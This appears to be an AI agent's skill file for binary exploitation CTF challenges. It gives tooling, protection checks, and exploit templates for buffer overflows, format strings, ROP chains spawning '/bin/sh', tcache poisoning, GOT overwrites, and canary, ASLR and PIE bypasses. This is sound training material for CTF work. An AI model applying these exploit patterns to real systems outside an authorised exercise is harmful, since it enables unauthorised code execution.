---
name: pwn
description: Binary exploitation (pwn) techniques and methodology. Use when solving buffer overflow, format string, ROP, heap exploitation, or other binary exploitation challenges.
---

# Binary Exploitation (Pwn)

Techniques and methodology for binary exploitation CTF challenges.

## Pre-installed Tools

- `pwntools` - Python exploitation framework
- `radare2` - Binary analysis
- `gdb` + `pwndbg` - Debugging
- `ROPgadget` - ROP chain building
- `one_gadget` - One-shot RCE gadgets

## Initial Analysis

### 1. Check Security Features

```bash
docker exec $CTF_CONTAINER checksec ~/ctf_files/binary
```

Key protections:
- **CANARY**: Stack canary protection
- **NX**: Non-executable stack
- **PIE**: Position Independent Executable
- **RELRO**: Relocation Read-Only

### 2. Identify Binary Type

```bash
docker exec $CTF_CONTAINER file ~/ctf_files/binary
docker exec $CTF_CONTAINER readelf -h ~/ctf_files/binary
```

## Common Vulnerability Classes

### Buffer Overflow

**Identification**:
- `gets()`, `scanf("%s")`, `strcpy()` without bounds
- Fixed-size buffers with unbounded input

**Exploitation**:
```python
from pwn import *

# Find offset to return address
# cyclic(200) + cyclic_find(crash_addr)

payload = flat(
    b'A' * offset,
    p64(return_address)
)
```

### Format String

**Identification**:
- `printf(user_input)` without format specifier
- `sprintf()`, `snprintf()` with user input

**Exploitation**:
```python
# Read from stack
payload = b'%p.' * 20

# Write to address (write-what-where)
# %n writes number of bytes printed so far
payload = fmtstr_payload(offset, {target_addr: value})
```

### Return Oriented Programming (ROP)

**Finding Gadgets**:
```bash
docker exec $CTF_CONTAINER ROPgadget --binary ~/ctf_files/binary
```

**Building Chain**:
```python
from pwn import *

binary = ELF('./binary')
rop = ROP(binary)

# Call system("/bin/sh")
rop.call('system', [next(binary.search(b'/bin/sh'))])
payload = flat(
    b'A' * offset,
    rop.chain()
)
```

### Heap Exploitation

**Common Techniques**:
- Use-After-Free (UAF)
- Double Free
- Heap Overflow
- Tcache poisoning
- Fastbin attack

```python
# Tcache poisoning example
alloc(0x20)     # chunk A
alloc(0x20)     # chunk B
free(A)         # A in tcache
free(B)         # B in tcache
# Overflow B's next pointer
edit(B, p64(target_addr))
alloc(0x20)     # get B
alloc(0x20)     # get target_addr
```

### GOT Overwrite

```python
binary = ELF('./binary')
got_puts = binary.got['puts']
plt_system = binary.plt['system']

# Overwrite GOT entry
write_what_where(got_puts, plt_system)
# Next call to puts() will call system()
```

## Pwntools Template

```python
#!/usr/bin/env python3
from pwn import *

# Context setup
context.binary = binary = ELF('./binary')
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

# Libc (if needed)
# libc = ELF('./libc.so.6')

def conn():
    if args.REMOTE:
        return remote('challenge.server', 1337)
    elif args.GDB:
        return gdb.debug('./binary', '''
            break main
            continue
        ''')
    else:
        return process('./binary')

def main():
    io = conn()
    
    # ===== EXPLOIT =====
    
    io.interactive()

if __name__ == '__main__':
    main()
```

## GDB Debugging

```bash
docker exec -it $CTF_CONTAINER gdb -q ~/ctf_files/binary
```

Common commands:
```gdb
# Breakpoints
break main
break *0x401234

# Run with input
run < payload.txt

# Examine memory
x/20wx $rsp
x/s $rdi

# Registers
info registers

# Find patterns
find &__libc_start_main, +0x300000, "/bin/sh"
```

## Bypassing Protections

### ASLR Bypass
- Leak addresses via format string or info disclosure
- Partial overwrite (only changing lower bytes)
- Brute force (32-bit)

### Stack Canary Bypass
- Leak canary via format string
- Brute force (forking servers)
- Overwrite terminating null byte

### PIE Bypass
- Leak binary base address
- Partial overwrite

## See Also

- [decompile](../decompile/SKILL.md) - Decompile functions
- [disassemble](../disassemble/SKILL.md) - View assembly
- [run-command](../run-command/SKILL.md) - Execute commands
